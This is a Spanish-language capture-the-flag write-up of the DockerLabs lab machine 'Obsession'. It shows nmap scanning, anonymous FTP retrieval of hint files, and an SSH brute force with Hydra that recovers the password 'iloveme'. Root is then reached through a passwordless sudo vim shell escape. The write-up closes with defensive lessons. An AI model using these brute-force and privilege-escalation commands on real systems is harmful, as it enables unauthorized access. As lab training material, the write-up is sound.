# Obsession — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🔵 Muy Fácil  
**SO:** Linux  
**Autor de la máquina:** Juan  
**Fecha de creación:** 25/06/2024  
**Técnicas:** Nmap · FTP anónimo · Análisis de archivos de texto · Código fuente HTML · Hydra · SSH · Privesc (vim/sudo)

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [FTP anónimo — archivos con pistas](#2-ftp-anónimo--archivos-con-pistas)
3. [Enumeración web — comentario HTML](#3-enumeración-web--comentario-html)
4. [Fuerza bruta SSH con Hydra](#4-fuerza-bruta-ssh-con-hydra)
5. [Escalada de privilegios](#5-escalada-de-privilegios)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

```bash
sudo bash auto_deploy.sh obsession.tar
```

> IP asignada: `172.17.0.2`.

```bash
ping -c 2 172.17.0.2
```

```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.055 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.027 ms
```

Escaneo inicial de puertos:

```bash
nmap -Pn 172.17.0.2
```

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Tres servicios. Escaneo con versiones:

```bash
nmap -p21,22,80 -sCV -Pn 172.17.0.2
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--  1 0  0  667 Jun 18 2024 chat-gonza.txt
|_-rw-r--r--  1 0  0  315 Jun 18 2024 pendientes.txt
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Russoski Coaching
```

> 💡 Nmap nos dice directamente que el FTP **permite acceso anónimo** y lista los dos archivos disponibles. Esta información del escaneo `-sCV` ahorra tiempo enorme.

---

## 2. FTP anónimo — archivos con pistas

El escaneo ya nos muestra los nombres de los archivos. Conectamos como `anonymous` (sin contraseña):

```bash
ftp 172.17.0.2
```

```
Name (172.17.0.2:caan31): anonymous
331 Please specify the password.
Password:
230 Login successful.
```

Descargamos los dos archivos:

```bash
ftp> ls
-rw-r--r--  1 0  0  667 Jun 18 2024 chat-gonza.txt
-rw-r--r--  1 0  0  315 Jun 18 2024 pendientes.txt
ftp> get pendientes.txt
226 Transfer complete.
ftp> get chat-gonza.txt
226 Transfer complete.
```

Leemos el contenido:

```bash
cat chat-gonza.txt
```

```
[16:21, 16/6/2024] Gonza: pero en serio es tan guapa esa tal Nágore como dices?
[16:28, 16/6/2024] Russoski: es una auténtica princesa pff...
[16:29, 16/6/2024] Russoski: en mi ordenador en una ruta segura, ahora cuando quedemos te lo muestro
[21:52, 16/6/2024] Gonza: buah la verdad tenías razón en, es hermosa...
[22:36, 16/6/2024] Russoski: te lo dije, ya sabes que yo tengo buenos gustos para estas cosas xD
```

```bash
cat pendientes.txt
```

```
1 Comprar el Voucher de la certificación eJPTv2 cuanto antes!
2 Aumentar el precio de mis asesorías online en la Web!
3 Terminar mi laboratorio vulnerable para la plataforma Dockerlabs!
4 Cambiar algunas configuraciones de mi equipo, creo que tengo ciertos
  permisos habilitados que no son del todo seguros..
```

> 💡 Del chat deducimos que el usuario **russoski** existe en el sistema. Del fichero pendientes, la pista 4 nos confirma que hay permisos mal configurados — lo que buscamos.

---

## 3. Enumeración web — comentario HTML

Visitamos `http://172.17.0.2` — la web de "Russoski Coaching". Inspeccionamos el código fuente:

```html
<!-- -- Utilizando el mismo usuario para todos mis servicios, podré recordarlo fácilmente -->
```

> 💡 Este comentario confirma que **russoski** usa el mismo nombre de usuario en todos los servicios — incluido SSH.

---

## 4. Fuerza bruta SSH con Hydra

Con el usuario confirmado, lanzamos Hydra:

```bash
hydra -l russoski -P ~/Descargas/rockyou.txt ssh://172.17.0.2
```

```
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
1 of 1 target successfully completed, 1 valid password found
```

Contraseña: **iloveme**. Conectamos:

```bash
sudo ssh russoski@172.17.0.2
```

```
russoski@172.17.0.2's password: iloveme
russoski@ff12275c3c3b:~$
```

✅ Acceso como **russoski**.

---

## 5. Escalada de privilegios

El fichero `pendientes.txt` ya nos avisó de permisos inseguros. Comprobamos sudo:

```bash
russoski@ff12275c3c3b:~$ sudo -l
```

```
User russoski may run the following commands on ff12275c3c3b:
    (root) NOPASSWD: /usr/bin/vim
```

**vim con sudo sin contraseña.** GTFObins nos da el comando exacto:

```bash
russoski@ff12275c3c3b:~$ sudo vim -c ':!/bin/sh'
# whoami
root
```

Encontramos la flag en `/root`:

```bash
# cd /root
# ls
Video-Nagore-Fernandez.txt
# cat Video-Nagore-Fernandez.txt
Al fin lo terminé! es tan hermosa.. <3
https://www.youtube.com/shorts/_v8GzGReTAk
```

✅ Somos **root**. Máquina comprometida.

---

## 6. Lección aprendida

Esta máquina tiene un elemento narrativo interesante: los propios archivos del servidor nos cuentan la historia del atacado y sus malas prácticas de seguridad.

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| **FTP anónimo con archivos de información** | Puerto 21 | Enumeración de usuario sin autenticación |
| **Comentario HTML con información de reutilización de usuario** | Código fuente web | Confirmación del nombre de usuario |
| **Contraseña débil (iloveme)** | SSH russoski | Fuerza bruta exitosa |
| **vim con sudo sin contraseña** | `/usr/bin/vim` | Escalada directa a root |

**Para defenderse:**
- Nunca habilitar FTP anónimo en producción, y menos dejando archivos con información interna.
- Los comentarios HTML son públicos — nunca revelar configuraciones o hábitos de seguridad.
- Reutilizar el mismo usuario en todos los servicios facilita el pivoteo del atacante.
- vim (y cualquier editor de texto) con sudo es una escalada garantizada. Evitarlo siempre.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
